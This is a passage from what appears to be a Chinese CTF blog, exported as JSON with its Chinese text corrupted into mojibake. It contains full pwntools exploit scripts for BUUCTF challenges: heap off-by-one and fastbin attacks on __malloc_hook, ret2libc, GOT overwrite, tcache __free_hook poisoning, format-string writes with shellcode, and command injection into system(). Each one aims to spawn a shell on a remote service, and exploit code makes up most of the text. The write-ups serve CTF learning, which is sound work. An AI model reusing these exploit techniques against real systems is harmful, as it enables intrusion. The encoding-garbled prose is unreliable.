ä½†æ˜¯æˆ‘ç”¨0x30çš„gadgetç«Ÿç„¶é€šäº†ï¼Œæœ¬åœ°å¯æ‹¿shell ä¸çŸ¥é“æ€ä¹ˆå›äº‹ï¼Œåæ­£æˆ‘äººå‚»äº†ï¼Œæœ‰æ„Ÿå…´è¶£çš„å¸ˆå‚…å¯ä»¥è°ƒè¯•ä¸€ä¸‹ä»€ä¹ˆåŸå› ï¼Œç„¶åç»™å¼Ÿå¼Ÿè®²è®²ï¼ˆorz è´´ä¸€ä¸‹expå§ï¼Œä¸‹åˆå†è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹LibcSearcherèƒ½ä¸èƒ½é€š exp: from pwn import * #context.log_level = 'debug' local = 1 if local == 1: p = process('./heapcreator') else: p = remote('node3.buuoj.cn',26697) libc = ELF('./libc.so.6') def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap : ',str(size)) p.sendafter('Content of heap:',content) def edit(index,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendafter('Content of heap : ',content) def show(index): p.sendlineafter('Your choice :','3') p.sendlineafter('Index :',str(index)) def delete(index): p.sendlineafter('Your choice :','4') p.sendlineafter('Index :',str(index)) print(&quot;åˆæ­¥æ€è·¯æ˜¯off-by-oneï¼Œå¯ä»¥æº¢å‡ºä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘æ„é€ é‡å chunk&quot;) add(0x18,'A') #chunk0 : to overflow the next chunk add(0x30,'B') #chunk1 add(0x60,'C') #chunk2 add(0x10,'D') #chunk3 : to protect edit(0,b'B' * 0x18 + b'\\xf1') delete(1) print(&quot;æ­¤æ—¶big chunkå·²ç»æ„é€ å®Œæˆï¼Œby gdb , we know the unsorted bin fd ptr and bk ptr&quot;) delete(2) print(&quot;by free 0x60 , we can change the fd pointer to fastbin attack&quot;) print(&quot;this method is 'one_gadget' &quot;) print(&quot;if we cannot success ,we could use some methods to attack got&quot;) add(0xe0,'E') #chunk4 print(&quot;we can leak libc&quot;) show(1) #p.recv() p.recvuntil('Content : ') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 37 - 0x10 libc_base = __malloc_hook - libc.symbols['__malloc_hook'] one_gadget_list = [0x3f3d6,0x3f42a,0xd5bf7] one_gadget = libc_base + one_gadget_list[1] print(hex(libc_base)) print(&quot;by gdb , we know we already have leaked the libc&quot;) print(&quot;the next,we do fake chunk&quot;) payload = p64(0) * 3 + p64(0x41) + p64(0) * 7 + p64(0x21) + p64(0xe0) + p64(0x9ba050) + p64(0) + p64(0x71) payload = payload + p64(__malloc_hook-0x23) edit(1,payload) add(0x60,p64(__malloc_hook-0x23)) add(0x60,b'A' * 0x13 + p64(one_gadget)) pause() p.interactive() åˆå®éªŒäº†ä¸¤æ¬¡ï¼Œå¤±è´¥çš„æ–¹æ³•ç»ˆäºé€šäº† æ€ä¹ˆè¯´å‘¢ï¼Œæ¯”èµ›ä¸ç»™libcæœç„¶æ˜¯æµæ°“é¢˜ åœ¨githubä¸Šä¸‹äº†ä¿©libcéƒ½ä¸è¡Œï¼Œæœ€åç”¨buuctfèµ„æºåº“é‡Œé¢æä¾›çš„libcæ‰“é€šäº† expæ²¡å˜ï¼Œå°±æ˜¯å¤šåŠ äº†ä¸¤è¡Œone_gadget_list(å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆè‰) from pwn import * #context.log_level = 'debug' local = 0 if local == 1: p = process('./heapcreator') else: p = remote('node3.buuoj.cn',26902) libc = ELF('./libc-2.23.so') def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap : ',str(size)) p.sendafter('Content of heap:',content) def edit(index,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendafter('Content of heap : ',content) def show(index): p.sendlineafter('Your choice :','3') p.sendlineafter('Index :',str(index)) def delete(index): p.sendlineafter('Your choice :','4') p.sendlineafter('Index :',str(index)) print(&quot;åˆæ­¥æ€è·¯æ˜¯off-by-oneï¼Œå¯ä»¥æº¢å‡ºä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘æ„é€ é‡å chunk&quot;) add(0x18,'A') #chunk0 : to overflow the next chunk add(0x30,'B') #chunk1 add(0x60,'C') #chunk2 add(0x10,'D') #chunk3 : to protect edit(0,b'B' * 0x18 + b'\\xf1') delete(1) print(&quot;æ­¤æ—¶big chunkå·²ç»æ„é€ å®Œæˆï¼Œby gdb , we know the unsorted bin fd ptr and bk ptr&quot;) delete(2) print(&quot;by free 0x60 , we can change the fd pointer to fastbin attack&quot;) print(&quot;this method is 'one_gadget' &quot;) print(&quot;if we cannot success ,we could use some methods to attack got&quot;) add(0xe0,'E') #chunk4 print(&quot;we can leak libc&quot;) show(1) #p.recv() p.recvuntil('Content : ') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 37 - 0x10 libc_base = __malloc_hook - libc.symbols['__malloc_hook'] #one_gadget_list = [0x3f3d6,0x3f42a,0xd5bf7] #one_gadget_list = [0x45226,0x4527a,0xf0364,0xf1207] #one_gadget_list = [0x45206,0x4525a,0xef9f4,0xf0897] one_gadget_list = [0x45216,0x4526a,0xf02a4,0xf1147] one_gadget = libc_base + one_gadget_list[1] print(hex(libc_base)) print(&quot;one_gadget:&quot; + hex(one_gadget)) print(&quot;by gdb , we know we already have leaked the libc&quot;) print(&quot;the next,we do fake chunk&quot;) payload = p64(0) * 3 + p64(0x41) + p64(0) * 7 + p64(0x21) + p64(0xe0) + p64(0x9ba050) + p64(0) + p64(0x71) payload = payload + p64(__malloc_hook-0x23) edit(1,payload) add(0x60,p64(__malloc_hook-0x23)) add(0x60,b'A' * 0x13 + p64(one_gadget)) p.interactive() ","link":"https://l3mon629.github.io/post/yi-dao-got-biao-ke-xie-de-off-by-one-hitcontraining_heapcreator/"},{"title":"buu-pwn(1)","content":"xdctf2015_pwn200 **é¢˜ï¼Œç®€å•é¢˜ï¼Œäº”åˆ†é’Ÿèƒ½å‡ºçš„é¢˜ç»™ğŸ‘´æ•´äº†ä¸€ä¸ªå¤šå°æ—¶ï¼Œå…¨æ˜¯æœ¬åœ°çš„libcå’‹ä¹ŸåŠ è½½ä¸ä¸Šå»ï¼Œå¹²è„†ç›´æ¥LibcSearcher æ²¡å•¥å¥½è¯´çš„ï¼Œåªå¼€äº†nx expï¼š from pwn import * from LibcSearcher import LibcSearcher #libc = ELF('./libc.so.6') #elf = ELF('./bof') local = 0 if local == 1: p = process('./bof') else: p = remote('node3.buuoj.cn',25267) p.recvuntil('Welcome to XDCTF2015~!\\n') offset = 0x6C + 0x4 write_plt = 0x080483C0 main_addr = 0x0804851C write_got = 0x0804A01C payload = offset * b'A' + p32(write_plt) + p32(main_addr) + p32(0) + p32(write_got) + p32(0x4) p.sendline(payload) write_addr = u32(p.recv()[0:4]) libc = LibcSearcher('write',write_addr) print(&quot;write:&quot; + hex(write_addr)) libc_base = write_addr - libc.dump('write') print('libcbase:' + hex(libc_base)) system_addr = libc_base + libc.dump('system') binsh_addr = libc_base + libc.dump('str_bin_sh') print(hex(binsh_addr)) payload = offset * b'A' + p32(system_addr) * 2 + p32(binsh_addr) p.sendline(payload) p.interactive() [BJDCTF 2nd]secret ç¬¬ä¸€æ¬¡ç¢°è§è¿™æ ·çš„é¢˜ï¼Œå¥½é¢˜ï¼ æ²¡æœ‰åšå‡ºæ¥wtcl æ€»ç»“ï¼Œä¸ºå•¥æ²¡åšå‡ºæ¥ï¼Ÿ 1ï¼Œæ‰¾åˆ°æº¢å‡ºç‚¹äº†ä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆåˆ©ç”¨ 2ï¼Œç¢°è§ä¸€å †æ±‡ç¼–ç å°±çœ‹ä¸ä¸‹å»äº†ï¼Œæ²¡æœ‰ä»”ç»†åˆ†æ å®Œæ•´è§£é¢˜è¿‡ç¨‹ï¼š checksecå‘ç°åªå¼€äº†nx æ‹¿åˆ°ida mainå‡½æ•°ï¼š __int64 __fastcall main(__int64 a1, char **a2, char **a3) { myinit(); if ( judge(a1, a2) ) wrong(); system(&quot;cat /flag&quot;); return 0LL; } å‘ç°æ˜¯æœ‰åé—¨çš„ï¼Œä½†æ˜¯å¥½åƒè¦ä¸è§¦å‘ifæ‰å¯ä»¥ï¼Œå¦‚æœifæ¡ä»¶æ»¡è¶³ï¼Œå°±ä¼šè¿›å…¥wrongï¼Œç‚¹è¿›å»çœ‹çœ‹æ˜¯è¿™æ ·çš„ wrongå‡½æ•°ï¼š void __noreturn wrong() { puts(&quot;#====================================#&quot;); puts(&quot;# GAME OVER #&quot;); puts(&quot;#====================================#&quot;); write_string(&quot;# BYE BYE~ #&quot;, 0x12); printf(buf, 0x12LL); puts(&amp;byte_46B0A7); puts(&quot;@====================================@&quot;); exit(0); } å°±é€€å‡ºç¨‹åºäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç‚¹è¿›å»ifé‡Œé¢çš„judgeå‡½æ•°çœ‹çœ‹ è¿™æ®µæ— æ³•æ˜¾ç¤ºä¸ºä¼ªä»£ç ï¼ˆå¥½åƒæ˜¯å¤§å°é™åˆ¶çš„åŸå› ï¼Œæ”¹idcè„šæœ¬åº”è¯¥å¯ä»¥åç¼–è¯‘ï¼Œä½†æ˜¯æˆ‘ä¸ä¼šorzï¼‰ ä»”ç»†é˜…è¯»æ±‡ç¼–ç ï¼Œå¯ä»¥å‘ç°é‡Œé¢æœ‰å¾ˆå¤šæ¯”è¾ƒçš„æ“ä½œï¼Œæˆ‘ä»¬èµ°åˆ°ç¨‹åºé‡Œï¼Œä¸å¦¨è¾“å…¥ä¸€ä¸ªæ•°å­—çœ‹çœ‹ï¼Œå‘ç°æ˜¯çŒœæ•°å­—çš„æ¸¸æˆï¼Œè¿ç»­çŒœå¯¹å°±å¯ä»¥è·å¾—flagï¼Œä½†æ˜¯è¦çŒœ10000æ¬¡ï¼Œåœ¨myinitå‡½æ•°é‡Œé¢ ç¬¬ä¸€ä¸ªç‚¹æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œé‡Œé¢å­˜äº†10000ï¼Œåº”è¯¥å°±æ˜¯çŒœå¯¹çš„æ¬¡æ•°ï¼Œä½†æ˜¯æ˜¯æŒ‡é’ˆï¼ŒæŒ‡é’ˆéƒ½æ˜¯éå¸¸å±é™©çš„ï½ ç„¶åç¬¬äºŒä¸ªç‚¹å°±æ˜¯æœ‰ä¸€ä¸ªreadï¼Œå¯ä»¥æº¢å‡ºï¼Œæˆ‘ä»¬ç‚¹è¿›å»bufçœ‹çœ‹ å¯ä»¥çœ‹åˆ°é‚£ä¸ªæŒ‡é’ˆå°±åœ¨bufä¸‹é¢0x10å¤„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯æ§çš„ç©ºé—´æ˜¯0x16ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ§åˆ¶targetæŒ‡é’ˆã€‚ é‚£ä¹ˆæˆ‘ä»¬æ§åˆ¶åˆ°å“ªé‡Œå‘¢ï¼Ÿ æˆ‘ä»¬åœ¨pwndbgé‡Œé¢å‘ç°printfçš„pltå’Œsystemçš„pltå¾ˆæ¥è¿‘ï¼Œå°±å·®0x10ï¼Œè€Œä¸”æ˜¯printfçš„pltæ¯”systemçš„å¤§0x10ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠtargetæ”¹å†™æˆprintfçš„gotåœ°å€ï¼Œç„¶åæ¯å½“çŒœå¯¹ä¸€æ¬¡targetå°±ä¼šå‡ä¸€ï¼Œå½“æˆ‘ä»¬çŒœå¯¹15æ¬¡ï¼Œç¬¬åå…­æ¬¡çŒœé”™å°±ä¼šè°ƒç”¨printf è€Œè¿™ä¸ªæ—¶å€™ï¼Œprintf@pltå·²ç»è¢«æ”¹æˆäº†system@pltï¼Œç„¶åå­˜åœ¨bufé‡Œé¢çš„å­—ç¬¦ä¸²ä¼šè¢«å½“æˆå‚æ•°ä¼ å…¥systemï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åœ¨è¾“å…¥nameçš„æ—¶å€™æŠŠbinshæ‰“è¿›å»å°±å¥½äº† expï¼š from pwn import * local = 0 #context.log_level = 'debug' if local == 1: p = process('./secret') else: p = remote('node3.buuoj.cn',25527) elf = ELF('./secret') printf_got = elf.got['printf'] payload = b'/bin/sh\\x00' + b'A' * (0x10 - 0x8) + b'\\x40\\xD0\\x46' #æœ€åé¢çš„æ˜¯printfçš„gotåœ°å€ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨p32å‘è¿‡å» #print(payload) p.sendline(payload) #pause() number = [0x476B,0x2D38,0x4540,0x3E77,0x3162,0x3F7D,0x357A,0x3CF5,0x2F9E,0x41EA,0x48D8,0x2763,0x474C,0x3809,0x2E63] for i in range(0,15): payload = number[i] p.recvuntil('Secret:') p.sendline(str(payload)) #pause() p.sendlineafter('Secret:','1') p.interactive() ciscn_2019_es_1 ä»Šå¤©å¤ªå¿™äº†ï¼Œåˆšæ¬äº†å®¿èˆï¼Œæ¢äº†æ–°ç¯å¢ƒï¼Œå¿™é‡Œå·é—²æ‰“äº†ä¸€é“å»å¹´çš„å›½èµ›é¢˜ ç›®å‰å°±æ‰¾åˆ°ä¸¤ç§æ€è·¯ï¼Œç¬¬ä¸€ç§æ€è·¯æ‰“fastbinçš„æ—¶å€™æœ‰äº›é—®é¢˜ï¼Œå› ä¸ºä¸å¤ªæ¸…æ¥špythonæ€ä¹ˆä¼ ç©ºå­—ç¬¦ä¸²ä¹‹ç±»çš„é—®é¢˜ï¼Œå¯¼è‡´ç»“æ„ä½“é‡Œé¢çš„æŒ‡é’ˆä¸€ç›´åœ¨å˜ï¼Œæ‰€ä»¥è¿™ç§æ€è·¯ç­‰è¿‡ä¸¤å¤©æœ‰ç©ºçš„æ—¶å€™å†æƒ³æƒ³å§ã€‚ç¬¬äºŒç§æ€è·¯å°±æ˜¯æ‰“__free_hookï¼Œ__free_hook(ready to free) === system(&quot;/bin/sh\\x00&quot;) å‡ ä¸ªç‚¹ï¼š å½“é¢˜ç›®å¯¹äºç”³è¯·çš„chunkå¤§å°é™åˆ¶æ— è¦æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥ç”³è¯·å¤§chunkï¼Œfreeåæ”¾å…¥unsorted binç›´æ¥æ³„æ¼libc æ”»å‡»__free_hookæ¯”one_gadgetæ›´ç®€å• exp: from pwn import * from LibcSearcher import * #context.log_level = 'debug' local = 1 if local == 1: p = process('./ciscn_2019_es_1') else: p = remote('node3.buuoj.cn',25338) def add(size,name,num): p.sendlineafter('choice:','1') p.sendlineafter('Please input the size of compary\\'s name',str(size)) p.sendafter('please input name:',name) p.sendafter('please input compary call:',num) def show(index): p.sendlineafter('choice:','2') p.sendlineafter('Please input the index:',str(index)) def delete(index): p.sendlineafter('choice:','3') p.sendlineafter('Please input the index:',str(index)) ''' print(&quot;ç¬¬ä¸€ç§æ€è·¯ï¼šåˆ©ç”¨fastbin attack æ”»å‡»__malloc_hookå‡½æ•°ï¼Œå°šæœªæˆåŠŸ&quot;) print(&quot;========== step 1 : leak libc ============&quot;) add(0x410,'a','b') #0 add(0x10,'c','d') #1 delete(0) show(0) p.recvuntil('name:\\n') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 96 - 0x10 libc = LibcSearcher('__malloc_hook',__malloc_hook) libc_base = __malloc_hook - libc.dump(&quot;__malloc_hook&quot;) print(&quot;libc base : &quot; + hex(libc_base)) print(&quot;=========== step 2 : fastbin attack =========&quot;) add(0x60,'A','B') #3 delete(3) delete(3) add(0x60,p64(__malloc_hook-0x23),'hack') print(&quot;=========== step 3 : one_gadget =========&quot;) one_gadget_list = [0x4f2c5,0x4f322,0x10a38c] one_gadget = libc_base + one_gadget_list[1] add(0x60,0x13 * b'A' + p64(one_gadget),'hhhh') #add(0x10,'a','b') pause() p.interactive() ''' print(&quot;ç¬¬äºŒç§æ€è·¯ï¼šåˆ©ç”¨unsorted biné€ƒé€¸å‡ºtcache binï¼Œç„¶åæ”»å‡»__free_hook&quot;) print(&quot;====================== step1 : leak libc =================&quot;) add(0x410,b'A' * 8,b'B') #0 add(0x10,b'/bin/sh\\00',b'D') #1 add(0x10,b'123',b'hack') #2 delete(0) show(0) p.recvuntil('name:\\n') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 96 -0x10 print(hex(__malloc_hook)) libc = LibcSearcher('__malloc_hook',__malloc_hook) libc_base = __malloc_hook - libc.dump('__malloc_hook') print(&quot;libc base:&quot; + hex(libc_base)) print(&quot;============ step2 : attack __free_hook function =================&quot;) print(&quot;__free_hook(chunk_mem) === system(binsh) &quot;) print(&quot;so we need change '__free_hook' to 'system' &quot;) __free_hook = libc_base + libc.dump(&quot;__free_hook&quot;) system_addr = libc_base + libc.dump(&quot;system&quot;) delete(2) delete(2) add(0x10,p64(__free_hook),b'lemon') #3 add(0x10,p64(system_addr),b'hack') #4 delete(2) p.interactive() ä¸´æ—¶åŠ ä¸ªæ”»é˜²ä¸–ç•Œï¼šstring è¿™ä¸ªé¢˜æ˜¯æœ‰ä¸ªå¸ˆå‚…é—®æˆ‘çš„ï¼Œå…¶å®åŸæ¥åšè¿‡äº†ï¼Œä½†æ˜¯å¥½ä¹…æ²¡æœ‰ç©è¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´äº†ï¼Œå°±é‡æ–°åšä¸€ä¸‹ æ”¶è·çš„å‡ ä¸ªç‚¹ï¼š 1ï¼Œæ³¨æ„mmapå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•° 2ï¼Œshellcode = asm(shellcraft.sh())èƒ½æ‰“é€šï¼Œå¦‚æœå†åŠ ä¸Šstr()å°±ä¸å¯ä»¥äº† exp: from pwn import * context.log_level = 'debug' local = 0 if local == 1: p = process('./dragon') else: p = remote('220.249.52.133',37799) p.recvuntil(&quot;secret[0] is &quot;) address = int(p.recvuntil(&quot;\\n&quot;),16) print(hex(address)) p.sendlineafter(&quot;What should your character's name be:\\n&quot;,'name') p.sendlineafter(&quot;So, where you will go?east or up?:\\n&quot;,'east') p.sendlineafter(&quot;go into there(1), or leave(0)?:\\n&quot;,'1') p.sendlineafter(&quot;'Give me an address'\\n&quot;,str(address)) print(&quot;ç»è¿‡æµ‹è¯•ï¼Œå‘ç°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯ç¬¬7ä¸ªå‚æ•°&quot;) payload = fmtstr_payload(7,{address:85}) p.sendlineafter(&quot;And, you wish is:\\n&quot;,payload) print(&quot;ç»è¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å¯ä»¥å‘é€shellcodeäº†ï¼Œå› ä¸ºmmapçš„ç¬¬ä¸‰ä¸ªå‚æ•°&quot;) context(os = 'linux',arch = 'amd64') shellcode = asm(shellcraft.sh()) #shellcode = asm(shellcraft.amd64.linux.sh()) print(shellcode) #shellcode = &quot;\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05&quot; p.recvuntil(&quot;Wizard: I will help you! USE YOU SPELL&quot;) p.sendline(shellcode) p.interactive() wustctf2020_closed å­¦åˆ°äº†ï¼ŒæŠ½ç©ºå¾—å­¦ä¹ ä¸‹IO_FILEçš„çŸ¥è¯† 0ï¼Œ1ï¼Œ2 åˆ†åˆ«å¯¹åº” stdin stdout stderr close(1) close(2)æ˜¯å…³é—­äº†å°†ç¨‹åºçš„è¾“å‡ºæ˜¾ç¤ºåˆ°å±å¹•ä¸Šï¼Œå¹¶ä¸”å…³é—­äº†æŠ¥é”™ä¿¡æ¯ å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å…¶å®å·²ç»æ‹¿åˆ°äº†shellï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥é‡å®šå‘å°±å¥½ exec 1&gt;&amp;0 ä¸éœ€è¦exp ç›´æ¥ncå°±å¥½ hitcontraining_magicheap é€†å‘ mainå‡½æ•°ï¼Œå‘ç°æ¡†èµ·æ¥çš„åœ°æ–¹æœ‰äº›å¯ç–‘ ç‚¹å¼€å‡½æ•°ï¼Œå‘ç°æœ‰åé—¨ åˆ›å»ºå †å— ç¼–è¾‘å †å—ï¼Œå­˜åœ¨æ¼æ´ï¼Œå¯ä»¥è‡ªå®šä¹‰å †å—ç¼–è¾‘çš„å¤§å°ï¼ˆè€æ¼æ´äº† åˆ é™¤å †å—ï¼ŒğŸˆšï¸UAF å› ä¸ºæ²¡æœ‰showå‡½æ•°ä¹‹ç±»çš„ï¼Œæ‰€ä»¥å¾ˆéš¾æ³„æ¼ä¿¡æ¯ï¼Œæ­£å¥½ç¨‹åºæ²¡å¼€pieï¼Œå¹²è„†ç›´æ¥åˆ©ç”¨åé—¨ï¼Œæƒ³åŠæ³•åœ¨magicé™„è¿‘ä¼ªé€ chunk find_fake_fastæ°¸è¿œæ»´ç¥ï¼ï¼ exp ç¯å¢ƒå¯èƒ½å‡ºé—®é¢˜äº†ï¼ŒåŒæ ·çš„expæ‰“äº†åæ¬¡æ‰é€šï¼Œæœ¬åœ°æ˜¯é€šäº†ï¼Œè¿œç¨‹ä¹Ÿç»ˆäºé€šäº† from pwn import * context.log_level = 'debug' local = 0 if local == 1: p = process('./magicheap') else: p = remote('node3.buuoj.cn',25199) def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap :',str(size)) p.sendafter('Content of heap:',content) def edit(index,size,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendlineafter('Size of Heap :',str(size)) p.sendafter('Content of heap:', content) def free(index): p.sendlineafter('Your choice :', '3') p.sendlineafter('Index :',str(index)) print(&quot;===== ç¬¬ä¸€ç§æ€è·¯ï¼š ä¸ç®¡åé—¨ï¼Œç›´æ¥fastbin attack æ‰“mallochook ======&quot;) print(&quot;======= ä½†æ˜¯æ²¡æœ‰showå‡½æ•°ï¼Œæˆ‘ä»¬æ— æ³•æ³„æ¼libc ======&quot;) print(&quot;æ‰€ä»¥ç»¼ä¸Šè€ƒè™‘ï¼Œè¦ä¸æˆ‘ä»¬è¿˜æ˜¯åˆ©ç”¨åé—¨å¥½äº†-.-||&quot;) ''' add(0x10,b'A' * 8) #chunk0 add(0x30,b'a' * 8) #chunk1 free(1) fake_chunk = 0x602062 payload = 0x10 * b'A' + p64(0) + p64(0x41) + p64(fake_chunk) print(&quot;payload length:&quot; + str(len(payload))) #print(p.recv()) #edit(0,41,payload) ''' print(&quot;double freeæä¸€ä¸‹&quot;) add(0x30,'A') #chunk0 add(0x60,'B') #chunk1 fake_chunk = 0x60207D free(1) payload = 0x30 * b'A' + p64(0) + p64(0x71) + p64(fake_chunk) print(&quot;è¿™é‡Œä¸çŸ¥é“å“ªé‡Œé”™äº†ï¼Œç¼–è¾‘åŠŸèƒ½æ€»æ˜¯ä¸Šä¸å»ï¼Œå¯èƒ½æ˜¯å‡½æ•°å†…éƒ¨ç¼–å†™çš„æœ‰é—®é¢˜ï¼Œæ‡’å¾—çœ‹äº†-.-&quot;) p.sendline('2') p.sendline('0') p.sendline(str(len(payload))) p.send(payload) #edit(0,len(payload),payload) add(0x60,p64(fake_chunk)) payload = 0x13 * b'A' + p64(0x1306) add(0x60,payload) p.interactive() bjdctf_2020_router å¥½é¢˜ï¼Œæ„Ÿè§‰è¿™ç§é¢˜æ‰æœ‰æ„æ€ï¼Œä¸åƒåˆ«çš„é¢˜ï¼Œç›´æ¥æ ˆæº¢å‡ºå•¥çš„æˆ–è€…ROPé“¾ ç›´æ¥çœ‹mainå‡½æ•° æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç•™è¨€åŠŸèƒ½ï¼Œè™½ç„¶æ— æ³•æ ˆæº¢å‡ºï¼Œä½†æ˜¯å¯ä»¥æ±¡æŸ“æ•°ç»„destï¼Œä¸ºä»€ä¹ˆè¦æ±¡æŸ“destï¼Ÿå› ä¸ºåœ¨1é‡Œé¢æœ‰system(dest)ï¼Œæˆ‘ä»¬åªéœ€è¦æ±¡æŸ“destï¼Œå˜æˆbinshå³å¯æ‹¿åˆ°shell exp from pwn import * local = 0 if local == 1: p = process('./bjdctf_2020_router') else: p = remote('node3.buuoj.cn',29147) elf = ELF('./bjdctf_2020_router') libc = ELF('./libc.so.6') def dbg(): context.log_level = 'debug' #dbg() p.recvuntil('Please input u choose:\\n') p.sendline('3') p.recvuntil('Your suggest will help us to do better!') payload = 0x20 * b'A' + b'/bin/sh\\x00' payload = payload.ljust(0x3A,b'a') p.send(payload) p.recvuntil('Please input u choose:\\n') p.sendline('1') p.interactive() ","link":"https://l3mon629.github.io/post/buu-pwn1/"},{"title":"tcache attack","content":"å…³äºtcacheå‚è€ƒäº†è¿™ä¸ªå¸ˆå‚…çš„åšå®¢ï¼šhttps://www.jianshu.com/p/9778331e1337 tcache tcacheç»“æ„ä½“ Tcacheæœºåˆ¶æ˜¯åœ¨libc-2.26ä¸­å¼•å…¥çš„ä¸€ä¸ªæ–°çš„å †ç®¡ç†æœºåˆ¶ã€‚ é¦–å…ˆæ˜¯å¼•è¿›äº†ä¸¤ä¸ªç»“æ„ä½“ï¼Œtcache_perthread_structå’Œtcache_entry tcache_perthread_struct: #define TCACHE_MAX_BINS 64 typedef struct tcache_perthread_struct{ char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS]; }tcache_perthread_struct; tcache_entry: typedef struct tcache_entry{ struct tcache_entry *next; }tcache_entry; ç¬¬ä¸€ä¸ªç»“æ„ä½“ç”¨æ¥ç®¡ç†å †ï¼Œå¤§å°ä¸º0x240ï¼Œå¯ä»¥ç®¡ç†å¤§å°å°äº0x400çš„å †å—ï¼Œä¸ºå•¥å‘¢ï¼Ÿå†™ä¸ªç®€å•çš„å°demoå¤§å®¶å°±æ˜ç™½äº† #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { void *p,*q,*r,*s,*x; x = malloc(0x10); p = malloc(0x20); q = malloc(0x20); r = malloc(0x30); s = malloc(0x40); free(p); free(q); free(r); free(s); free(x); void *c1,*c2,*c3; c1 = malloc(0x50); c2 = malloc(0x60); c3 = malloc(0x70); free(c1); free(c2); free(c3); return 0; } ä¸Šé¢ç®€å•çš„ä¾‹å­ï¼Œå°±æ˜¯ç”³è¯·äº†ä»0x10-0x70å¤§å°çš„å †å—ï¼Œç„¶åæˆ‘ä»¬å…¨éƒ¨éƒ½freeæ‰ï¼Œç„¶ågdbè°ƒè¯•ä¸€ä¸‹ä¼šå‘ç°å¦‚ä¸‹ç»“æœ å¯ä»¥çœ‹åˆ°tcache_perthread_structç»“æ„ä½“æ˜¯ä»¥ä¸€ä¸ªå †çš„å½¢å¼å­˜åœ¨äºå †ç©ºé—´ä¸­ç®¡ç†è€…å †å—ï¼Œå…¶å¤§å°ä¸º 0x250ï¼Œç„¶åä¸è€ƒè™‘å…¶prevsizeå’Œsizeä½ï¼Œå‰0x40çš„ç©ºé—´ç®¡ç†ç€æ‰€æœ‰tcache binçš„ä¸ªæ•°ï¼ˆæœ€å¤§æ˜¯7ï¼‰ï¼Œä»0x10å¼€å§‹ï¼Œé‚£ä¹ˆå°±æ˜¯ 0x40 * 8 * 2 = 1024ï¼Œhex(1024) = 0x400ï¼Œæ‰€ä»¥å®ƒæœ€å¤§å¯å­˜åˆ°0x400çš„å †å—ã€‚ å¯¹æ¯”fastbin tcache binä¸fastbinæå…¶ç›¸ä¼¼ä½†æ˜¯åˆæœ‰æ‰€ä¸åŒ åŒï¼šç®¡ç†æ–¹å¼ä¸ºFILOçš„å•é“¾è¡¨å½¢å¼ï¼Œæ¯ä¸€ä¸ªbinsçš„inuseä½æ€»ä¸º1ï¼Œä¸æ‹…å¿ƒåˆå¹¶ å¼‚ï¼šfastbinçš„fdçš„æŒ‡é’ˆæŒ‡å‘chunk ptrï¼Œè€ŒtcacheæŒ‡å‘mem ptrã€‚tcacheä¸æ£€æŸ¥chunkçš„sizeæ˜¯å¦ç¬¦åˆè¦æ±‚ï¼Œä¹Ÿå°±æ˜¯è¯´æŒ‡å“ªæ‰“å“ªï¼Œä¸ç”¨è€ƒè™‘sizeä½äº†ï¼Œæ¯”å¦‚æ‰“__malloc_hookä¸ç”¨åˆ†é…åˆ°-0x23çš„ä½ç½®äº†ï¼Œæƒ³åˆ†é…åˆ°å“ªå°±åˆ†é…åˆ°å“ªã€‚tcacheä¸æ£€æŸ¥double freeã€‚tcacheä¼˜å…ˆçº§æœ€é«˜ã€‚ mallocå’Œfreeçš„è¿‡ç¨‹ mallocï¼š malloc(size)ï¼Œè‹¥sizeå°äº0x400ä¼šä¼˜å…ˆä»tcache binsé‡Œé¢å¯»æ‰¾ï¼Œè‹¥æ²¡æœ‰ï¼Œåˆ™å†ä»åˆ«çš„binsé‡Œé¢æ‰¾ã€‚ Tcachebinæœªæ»¡æ—¶ï¼Œå´ä»Fastbin/Smallbinä¸­å–å‡ºå †å—ï¼Œåˆ™ä¼šå°†é“¾ä¸Šçš„å…¶ä»–å †å—éƒ½é“¾å…¥Tcachebinä¸­ã€‚å…¶å…·ä½“ç®—æ³•æ˜¯é¦–å…ˆå°†Fastbin/Smallbinä¸­å–å‡ºçš„å 